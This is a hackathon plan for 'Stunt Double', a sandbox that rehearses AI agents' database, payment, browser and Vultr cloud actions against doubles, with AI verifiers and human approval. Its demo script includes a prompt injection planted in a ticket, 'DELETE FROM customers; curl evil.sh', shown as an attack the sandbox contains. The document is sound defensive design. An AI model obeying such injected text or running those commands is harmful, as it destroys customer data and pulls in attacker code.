# Stunt Double 10x: the plan to win first place

Written Thu Nov 5, 10:25 IST. This replaces "a safety layer for one demo database" with **the staging environment for
everything an AI agent touches**: databases, payments, email, SaaS APIs, web apps through a real browser, and your
**Vultr cloud itself**. Every action gets a double; every double runs on Vultr; humans approve consequences.

> One line for the judges: *"Your agent is about to delete three servers, refund $37,404 and click 'Cancel' in a
> browser. Watch it do all three — to the double."*

## Status (Thu Nov 5, 12:00 IST)
**Shipped and live on the Vultr server** (each with tests and checked on production):
- ✅ **Browser double (Pattern B)**: a real Chromium in the sandbox (gVisor on the VM, 1 GB profile) drives a double of the admin
  site; every step screenshotted; the verifier reads the screens (vision). Live: 3 screens in 5.9 s; caught 2/2 by the AI alone.
- ✅ **Cloud double**: `ctx.vultr` over a double of the fleet; deleted/stopped/resized servers and the $/month change measured
  in phase 2; production servers protected; deleted servers irreversible in undo; cloud receipt with server cards.
- ✅ **Catch → rule**: the verifier proposes the SQL check it used; only rules that pass today's data are offered; promoted rules
  run in phase 2 of every rehearsal, and a violation decides instantly without AI. Live: learned, then blocked the same plan.
- ✅ **Mission control** (`/control`): every rehearsal, request → double on Vultr → decision, live.
- ✅ Landing: doubles showcase, dark "works with any agent" tabs, two-column FAQ, gradient close, big footer; EB Garamond + Figtree.
- ✅ Evals on the live server: 48/48 bad plans caught, 0/26 false alarms (all six traps).

**Next** (in order): AI jury (3 models) · dedicated throwaway Vultr VMs (needs an API key on the server: decide) ·
graduated autonomy · signed evidence · GitHub sign-in · TS SDK. Demo script for the 1-minute video: `docs/DEMO_1MIN.md`.

## 0. Feasibility, proven this morning (Thu 10:25–10:30 IST)
| Question | Result |
|---|---|
| Can a throwaway Vultr VM back a single rehearsal? | **Yes.** vc2-1c-1gb created → `active/running/ok` in **36.5 s** → destroyed → `404` from the API **0.4 s** later. Cost ≈ $0.007. |
| Can a real Chromium run inside our sandbox rules? | **Yes.** `--network none`, read-only root, non-root, 1 GB, `cap-drop ALL`: launched, clicked, screenshotted in **0.9 s**; `goto` to the internet → `ERR_INTERNET_DISCONNECTED`; environment nearly empty. (Tested on runc; **gVisor run on the VM is Thursday's first task**.) |
| Does the Vultr API expose what a cloud double needs? | **Yes.** Instances (plan, region, power, tags, firewall group), firewalls, snapshots, block storage, reserved IPs and load balancers are all readable; plans carry `monthly_cost`. |
| Is there a vision model on Vultr? | **Yes.** `glm-5.3-flash` is natively multimodal; `qwen3.8-27b` is a vision-language model. Safety: `nemotron-3.5-content-safety`. |
| Can it catch the browser trap from a screenshot? | **Yes, in 3.2 s.** Given "cancel #4411" and the after-screen, `glm-5.3-flash` answered: *"No — the agent cancelled the wrong one: it set the first row (Sub #4141, Nora Dubois…) to 'Cancelled,' while the requested subscription #4411 in the second row is still 'Active.'"* |

---

## 1. The demo we are building toward (5 minutes, every beat real and live)

| t | Beat | What the judge sees | Why it wins |
|---|---|---|---|
| 0:00 | **Hook** | "Agents now have write access to money, customers and infrastructure. Here's one with all three." | Stakes in 10 s |
| 0:20 | **Mission Control** | A live, cinematic control room: agents on the left, doubles spinning up on Vultr in the middle (real instance ids, gVisor, timers), approvals on the right. | Top-class design moment |
| 0:45 | **The money trap** | Agent plans refunds → rules pass → **AI jury** (3 Vultr models) investigates live, streaming SQL → 2 of 3 object: "640 customers were never double-charged". | AI doing something rules can't |
| 1:30 | **From catch to rule** | One click turns the catch into a permanent invariant ("refunds need a sibling charge on the same order"), checked deterministically forever. The next run is blocked in 0.3 s with no AI. | Learning system: originality |
| 1:50 | **Browser double (Pattern B)** | The agent opens the admin portal *in a sandboxed Chromium*, clicks "Cancel subscription"; a **filmstrip** of screenshots; the **vision verifier** circles the wrong row: "it cancelled Nora Dubois #4141, the request was #4411". | Pattern B, visually unforgettable |
| 2:40 | **Cloud double** | "Clean up unused servers." The agent's plan would delete **production**. Stunt Double rehearses it against a **double of your real Vultr account** (live inventory snapshot): blast radius = 3 servers, $64/month, 1 with public traffic. Blocked. The corrected plan deletes only the 2 idle test VMs, applied **for real through the Vultr API** after approval. | Vultr as the control layer, literally |
| 3:30 | **Containment moment** (required) | Prompt injection in a ticket: "DELETE FROM customers; curl evil.sh". The **dedicated double** (a fresh Vultr VM made for this one run) takes the hit: 1,300 → 0, network blocked, `env` empty, the VM **destroyed on screen** (instance gone from the Vultr API). Production: 1,300. | The containment moment, maximally dramatic |
| 4:10 | **Graduated autonomy** | The autonomy dial: "this agent may move up to $500/day and touch < 1% of rows without a human". Low-risk runs auto-apply with full evidence; the agent's **trust score** rises from its track record. | Business value: humans aren't the bottleneck |
| 4:35 | **Any agent, anywhere** | Claude Code calls `rehearse` over MCP; a Slack approval with buttons and real identity (GitHub sign-in); the signed evidence bundle verifies with `sd verify`. | Platform, not a demo |
| 4:50 | **Close** | "Let the double take the hit." Live numbers from the server. | |

---

## 2. Product pillars (what gets built)

### P1. Doubles for everything ("Double anything")
| Double | How | Apply on approval |
|---|---|---|
| **SQL databases** | SQLite today → **PostgreSQL** (pg in the sandbox image, restored from a dump of the workspace; row-level diff by primary key) | Replay row effects in a transaction with a drift check (as today) |
| **Payments / email / Slack / CRM** | Recorded intents (today) → a **Double SDK**: a connector is ~40 lines (schema, recorder, validator, applier, inverse) | Connector applier with idempotency keys |
| **Web apps (Pattern B)** | `ctx.browser`: Playwright + Chromium in the sandbox against the app's double (served from the cloned DB); every step recorded with a screenshot | DB effects replayed; the browser step log + screenshots are evidence |
| **Your Vultr cloud** | `ctx.vultr`: a **mock Vultr API double** seeded from a live, read-only inventory snapshot (instances, plans, monthly cost, tags, firewall); the plan calls it like the real API | After approval: the recorded calls are replayed against the **real Vultr API** (allowlisted methods, credit guard) |
| **Object storage** | Copy-on-write prefix of a Vultr Object Storage bucket | Replay put/delete |

### P2. Verification that is genuinely smarter than rules
- **AI jury**: three different Vultr models (`glm-5.3-flash`, `qwen3.8-flash-next`, `deepseek-v4.1-flash`) judge independently;
  the verdict shows agreement. A split verdict escalates to two humans. Disagreement is a signal, not noise.
- **Vision verifier** for browser runs (multimodal `glm-5.3-flash`) on the screenshots.
- **Content safety** (`nemotron-3.5-content-safety`) on every outbound email/message/payload.
- **Catch → rule**: the verifier writes the check it used as a SQL invariant; one click promotes it to policy;
  invariants run deterministically on every future rehearsal (milliseconds, no AI). The policy *learns from catches*.
- **Counterfactual probes**: the verifier may ask for "run it again with this one row changed" (cheap re-rehearsals).

### P3. Graduated autonomy (business value)
- Per-agent **blast-radius budget** (money/day, rows %, recipients, cloud $/month), auto-approve inside it, two-person rule outside.
- **Trust score** per agent from its history (catch rate, overrides, rollbacks); budget grows with trust.
- **Kill switch**: one button freezes an agent; pending runs park.

### P4. Mission Control UI (top-class design)
- A cinematic live view: lanes for agents → doubles → verdicts → approvals; real Vultr instance cards booting/destroyed;
  live counters (money kept, rows protected, attacks contained).
- The approval experience rebuilt around a **"consequence receipt"**: one screen, plain English, big numbers, the
  filmstrip / cloud diff / row diff as tabs, the AI jury, the signature.
- Motion: purposeful (sandbox boot, verdict reveal, the double "taking the hit" — the shatter); type: EB Garamond + Figtree.
- Mobile approval page (approve from the phone in 2 taps, with identity).
- Dark mode, done properly.

### P5. Real identity and approvals where people are
- GitHub sign-in for approvers (fixes the "typed names" limitation; two-person rule becomes real).
- Slack interactive approval messages (buttons → signed callback); email magic links.
- Roles: requester (agent), approver, admin (policy), auditor (read + export).

### P6. Evidence you can verify
- Hash-chained audit log (each run links the previous hash); **ed25519-signed evidence bundles**; `sd verify` checks a bundle
  offline (plan, effects, approvals, signatures, chain). Archived to Vultr Object Storage.

### P7. Platform and ecosystem
- **TypeScript SDK** (+ the Python SDK), **OpenAI Agents SDK / LangChain tool wrappers** (`rehearsed(tool)`), MCP (today).
- **GitHub Action**: rehearse a data migration or an agent plan in CI and comment the consequence receipt on the PR.
- **Red-team arena**: a public page where anyone submits a malicious plan; containment stats live; the hall of attacks.

### P7b. Two cheap features with outsized demo value
- **Model shootout**: the same request goes to 3–4 agent models on Vultr *at once*, each in its own double. Side by side:
  which model would have refunded $37,404, which got it right, cost and time per model. "Pick the safest model for this
  workflow, with evidence." It uses the breadth of Vultr Serverless Inference, and every double runs in parallel.
- **Freeze windows + incident replay**: a policy rule "no destructive changes during a code freeze" (time-boxed), and a
  replay scenario of the well-known 2025 incident, where an agent deleted a production database during a code freeze: here the
  agent's `DROP`/mass delete hits the double, the freeze rule locks approval, and production is untouched. A story every
  judge already knows, with a new ending.

### P8. Vultr all the way down
VM (control plane) · gVisor sandboxes · **dedicated throwaway VMs** per high-risk rehearsal (API) · Serverless Inference
(agent, jury, vision, safety, **TTS narration** of the receipt for approvers on the move) · Object Storage (evidence) ·
Managed PostgreSQL (the platform's own state) · Vultr API as a double target (cloud doubles).

---

## 3. How it gets built in 3.5 days: parallel lanes

The lever is **parallelism**: independent lanes in separate git worktrees, each with its own tests, merged behind CI and
deployed continuously. (Agents run in parallel; tokens cost more; quality gates stay: tests + e2e on production after every merge.)

| Lane | Scope | Est. | Depends on |
|---|---|---|---|
| **L1 Core engine** | Double SDK refactor (connector interface), Postgres double, invariants engine (catch → rule), AI jury | 10 h | — |
| **L2 Browser double** | Sandbox image with Chromium, `ctx.browser`, recorded steps + screenshots, admin-portal app for the double, vision verifier, trap 4 | 10 h | L1 interface (stubbed) |
| **L3 Cloud double + dedicated VMs** | Vultr inventory snapshot, mock Vultr API double, `ctx.vultr`, real-API applier; dedicated throwaway VM runner + watchdog | 9 h | — |
| **L4 Mission Control + design** | Mission Control live view, consequence receipt redesign, filmstrip, cloud diff, jury UI, mobile approvals, dark mode, autonomy dial UI | 12 h | L1–L3 APIs (mock first) |
| **L5 Identity, autonomy, evidence** | GitHub sign-in, roles, Slack buttons, autonomy budgets + trust score, hash chain + ed25519 + `sd verify`, content safety | 9 h | L1 |
| **L6 Ecosystem + proof** | TS SDK, OpenAI Agents/LangChain wrappers, GitHub Action, red-team arena, model shootout, freeze windows + incident replay, evals for every new trap, BENCH | 10 h | L1–L3 |
| **L7 Story** | README "How Vultr powers it", deck, cover, video (Vultr TTS), submission, community posts | 8 h | everything |

Total ≈ **66 hours of work**, compressed to ~2.5 days of wall-clock by running 3–4 lanes at once.

### Schedule (IST)
| When | Lanes running | Exit criterion |
|---|---|---|
| Thu 10:30–16:00 | L1 · L3 · L4 (design system + Mission Control shell) | Double SDK merged; cloud double rehearses a real inventory snapshot; Mission Control skeleton live |
| Thu 16:00–24:00 | L1 (jury, invariants) · L2 · L4 | Jury + catch→rule live on prod; browser double runs in gVisor |
| Fri 09:00–15:00 | L2 (vision, trap 4) · L3 (dedicated VMs, real apply) · L5 | Pattern B demo end to end; the dedicated VM visibly created and destroyed |
| Fri 15:00–24:00 | L4 (receipt, filmstrip, mobile, dark) · L5 (identity, autonomy, evidence) · L6 | Full 5-minute demo runnable on production |
| Sat 09:00–14:00 | L6 evals for all traps · security review of new surfaces · fixes | Evals published; review findings fixed |
| Sat 14:00–18:00 | Polish pass on every screen (design QA on desktop + phone) | **Feature freeze 18:00** |
| Sat 18:00–24:00 | L7: video (Vultr TTS), deck, cover, README | Video ≤ 5 min uploaded unlisted |
| Sun 09:00–20:00 | Buffer · production smoke · **submit** · posts | Submitted by 20:00 IST |

### Cut lines (decided in advance)
1. Behind Thu midnight → drop the Postgres double (keep SQLite) and the red-team arena.
2. Behind Fri midnight → drop TS SDK + GitHub Action; keep wrappers in Python only. Dedicated VMs become "on demand" only.
3. Never cut: cloud double, browser double, jury + catch→rule, Mission Control + receipt redesign, the containment moment, the video.

---

## 4. Quality bar (non-negotiable)
- Every new double has adversarial tests (escape, secrets, resource caps) and an eval with real models on the live server.
- e2e grows to cover every demo beat; it runs against production after each deploy.
- A security review round 4 on all new surfaces (cloud apply, browser, identity, signatures) on Saturday morning.
- Claims in README/deck/video are only measured numbers.
- Design QA: every screen at 390 px and 1440 px, light and dark, no layout shift, real data.

## 5. Budget (hard cap $50; spent ≈ $1.30)
| Item | Estimate |
|---|---|
| Main VM | $3 |
| Dedicated throwaway VMs (vc2-1c-1gb at $0.007/h; ~200 runs, billed per hour started) | ≤ $2 |
| Inference: agent + jury (3 models) + vision + safety + TTS + evals | ≤ $20 |
| Object Storage (evidence archive) | $6 |
| Managed PostgreSQL (optional, platform state) | ≤ $5 prorated, only if L1 needs it |
| Headroom to the cap | ≈ $14; kill switch at $40 |

## 6. Risks and answers
| Risk | Answer |
|---|---|
| Too much scope | Lanes are independent; cut lines are fixed above; production stays green throughout |
| Chromium under gVisor | Separate browser profile (1 GB, longer timeout); fallback documented honestly |
| Real Vultr API apply is dangerous | Allowlisted methods only (delete/resize instances tagged `double-demo`), credit guard, two-person rule, demo VMs created for the purpose |
| Parallel merges break prod | Each lane merges only with green tests + e2e; prod e2e after each deploy; revert fast |
| Judges' time is short | Mission Control "Watch it" autopilot runs the whole 5-minute story on its own |
| Deadline ambiguity | Confirm on lablab today; submit Sun 20:00 IST |

---

## 7. Lane specs (interfaces + acceptance tests, so lanes can run in parallel)

### L1 Core engine
- `api/app/doubles/base.py`: `class Double` with `snapshot() → dict`, `record(intent)`, `validate(intents, before) → audit`,
  `apply(effects, key)`, `inverse(effects)`, `consequences(effects) → receipt section`. Existing payments/email/http move behind it.
- `api/app/doubles/postgres.py`: workspace kind `postgres` (dump → sandbox pg → diff by primary key).
- `api/app/invariants.py`: SQL invariants `{id, sql_must_return_zero_rows, title, source_run}`; run in phase 2 against the
  after-DB; a violation becomes a critical flag. `POST /api/runs/{id}/promote-catch` turns the verifier's evidence query into an invariant.
- `api/app/jury.py`: three models in parallel; verdict = majority, `agreement` 1/3..3/3; a split → two-person rule.
- **Accept when**: existing 101 tests pass unchanged; new tests: an invariant blocks the semantic trap with no AI;
  a split jury forces two approvers; the Postgres double diff equals the SQLite diff for the same plan.

### L2 Browser double (Pattern B)
- `sandbox/Dockerfile.browser` (Playwright + Chromium, non-root, `--network none`; the double admin app served on
  127.0.0.1 inside the same sandbox from the cloned DB).
- `ctx.browser.goto/click/fill/select/screenshot` → recorded steps `{action, selector, value, url, screenshot_png}`.
- `web/src/components/filmstrip.tsx`: step thumbnails, the action under each, the verifier's annotations as boxes.
- Vision verifier: `glm-5.3-flash` with the screenshots + the request + the DB diff.
- **Accept when**: trap 4 is caught by vision on the live server in ≥ 4/5 runs; containment tests pass in the browser
  profile (no network, no env, caps); p50 browser rehearsal < 20 s in gVisor.

### L3 Cloud double + dedicated VMs
- `api/app/doubles/vultr_cloud.py`: read-only inventory snapshot via the Vultr API (instances, plans + monthly cost, tags,
  firewalls, snapshots, block storage); a mock API in the sandbox implementing `GET/DELETE /instances`, `PATCH /instances/{id}`
  (resize), `POST /instances/{id}/halt`, snapshots; recorded calls are the effects.
- Receipt section: servers deleted/resized/halted, $/month delta, "has public traffic" (from tags + firewall), production
  marked. Policy: never delete a server tagged `production` or `stunt-double`.
- Applier: the real Vultr API, allowlisted methods, only on instances tagged `double-demo` (created for the demo), credit guard.
- `api/app/dedicated.py`: a throwaway VM per rehearsal (vc2-1c-1gb or preemptible), cloud-init pulls the job with a signed
  one-time token, runs both phases, posts results, then the API destroys it; watchdog destroys anything > 15 min old;
  max 1 concurrent; lifecycle events streamed to the UI.
- **Accept when**: "clean up unused servers" against the live inventory is blocked for production and allowed for idle demo
  VMs; approval really deletes the demo VMs (verified via the API); a dedicated run shows created → destroyed with the
  instance id, and the instance is gone afterwards.

### L4 Mission Control + design
- `/control`: lanes (agents → doubles → verdicts → approvals), live via SSE; Vultr instance cards; counters.
- Receipt redesign (`approval-card.tsx` → `receipt/`): hero sentence, 4 big numbers, tabs (rows · filmstrip · cloud · emails ·
  API calls · code), the jury with model badges, the signature footer.
- "Watch it" autopilot: scripted sequence of real runs with captions, re-runnable.
- Mobile approvals (`/approve/{id}`), dark mode (tokens already exist), motion polish.
- **Accept when**: design QA checklist passes at 390/1440 px, light/dark; Lighthouse ≥ 95 performance and accessibility on `/`.

### L5 Identity, autonomy, evidence
- GitHub OAuth (approver identity); roles; Slack interactive buttons (signed callbacks); email magic link.
- `api/app/autonomy.py`: per-agent budgets, trust score, auto-apply inside budget (with full evidence), kill switch.
- `api/app/evidence.py`: hash chain + ed25519 signatures; `sd verify bundle.json`; Object Storage archive.
- `nemotron-3.5-content-safety` on outbound content.
- **Accept when**: two-person rule requires two distinct GitHub accounts; auto-apply happens only inside budget (tests at
  the boundary); `sd verify` rejects a tampered bundle; unsafe email text is flagged.

### L6 Ecosystem + proof
- `sdk/typescript` (npm-ready), `sdk/python/stunt_double/integrations/{openai_agents,langchain}.py`, `.github/actions/rehearse`.
- `/arena`: submit a plan → rehearsed in a dedicated double → result in the public hall of attacks (rate-limited).
- Evals: every trap (money, injection, consent, browser, cloud) × 5 runs on production; BENCH (gVisor vs dedicated VM).
- **Accept when**: the example agents in `examples/` run green in CI; evals published with numbers the README quotes.

---

## 8. Design direction ("top class")
- **Type**: EB Garamond (display; italics for the emphasis word) + Figtree (UI) + Geist Mono (numbers, machine text).
  Big, confident display sizes on marketing pages; in the product, quiet UI and loud numbers.
- **Color has a job**: black and white base; blue = the brand and "something is running"; green = safe or applied;
  red = damage only. Never decorative.
- **Mission Control**: a dark, full-bleed operations view (the one place we go dark by default). Three columns flow left
  to right, *Agents → Doubles → Decisions*. Each rehearsal is a card that physically moves across, lit by state: booting (blue
  pulse), measured (white), caught (red edge), approved (green). Vultr instance cards show region, plan, uptime and
  **destroyed** with a strike-through and the exact second. Ambient counters: money kept, rows protected, attacks contained,
  doubles destroyed today.
- **The consequence receipt**: reads like a bank receipt. One sentence of what happens, four big numbers, a seal (plan +
  effects SHA-256), the jury's three faces (model badges) with their one-line verdicts, then evidence tabs.
- **The filmstrip** (browser double): 16:10 thumbnails on a dark rail, the step under each ("click → Cancel #4141"), the
  vision verifier's red box drawn exactly where the mistake is.
- **The cloud diff**: server cards before/after; deleted ones fade to a red outline with $/month; production carries a lock.
- **Motion**: 150–300 ms ease-out, only for state changes; the "shatter" when a double is destroyed; nothing loops forever
  except the live pulse.
- **Footer and landing**: the big sign-off (done), section rhythm 96–128 px, product shots as the hero, real numbers only.
- **Design QA gate** (Sat 14:00–18:00): every screen at 390 / 768 / 1440 px, light + dark, keyboard focus states, no
  layout shift, empty/loading/error states designed, real data everywhere.

---

## 9. Kickoff checklist (the first 3 hours after "go")
1. **gVisor + Chromium on the VM** (the one feasibility gap): build `sandbox/Dockerfile.browser` on the VM; run the
   Chromium probe under `runsc` from a deploy hook; record the result in BENCH.md. If it fails, try `runsc --platform=systrap`
   flags, then decide (documented) by 13:30.
2. **Double SDK skeleton** (`api/app/doubles/`) with payments/email/http moved behind it; all 101 tests green.
3. **Cloud double v0**: inventory snapshot from the live account → mock Vultr API in the sandbox → `ctx.vultr.instances.delete(id)`
   recorded → receipt "cloud" section with $/month. Test against a fixture inventory.
4. **Mission Control shell** (`/control`) streaming real runs, plus the receipt redesign tokens.
5. Create two tiny **`double-demo` VMs** (vc2-1c-0.5gb, $0.003/h) as the safe targets for the cloud-apply demo; the
   policy forbids touching anything else.
6. Commit, deploy, run e2e on production, post progress to the user.
